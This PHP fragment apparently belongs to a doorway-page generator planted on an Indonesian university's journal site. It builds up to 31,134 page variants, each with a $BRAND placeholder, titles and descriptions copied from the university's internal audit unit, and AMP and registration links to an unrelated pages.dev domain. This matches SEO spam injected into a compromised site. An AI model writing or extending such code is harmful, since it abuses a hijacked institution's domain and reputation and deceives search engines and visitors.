...
$baseAuthor = $BRAND;
$URL  =  "https://spi.uinsaid.ac.id/ojs/?haha=$BRAND";
$PAGEURL = "https://spi.uinsaid.ac.id/ojs/?haha=$BRAND";
$AMP = "https://robotwkwkwk.pages.dev/ojs/?haha=$BRAND";
$DAFTAR = "https://robotwkwkwk.pages.dev/ojs/";
$BANNER = "https://smily.one/nn/5678.jpg";
$LOGO = "https://smily.one/pic/31.png";
$keyword = "$brand";

if ($NUMLIST >= 1 && $NUMLIST <= 31134) {
    $TITLE = "$BRAND 🥜 Satuan Pengawasan Internal UIN Raden Mas Said Surakarta";
    $DESCRIPTION = "$BRAND adalah lembaga internal di kampus yang bertugas melakukan pengawasan atas pelaksanaan fungsi kelembagaan, keuangan, maupun operasional agar sesuai dengan prinsip good governance, integritas, dan akuntabilitas.";
    $description = "$BRAND adalah lembaga internal di kampus yang bertugas melakukan pengawasan atas pelaksanaan fungsi kelembagaan, keuangan, maupun operasional agar sesuai dengan prinsip good governance, integritas, dan akuntabilitas.";
}
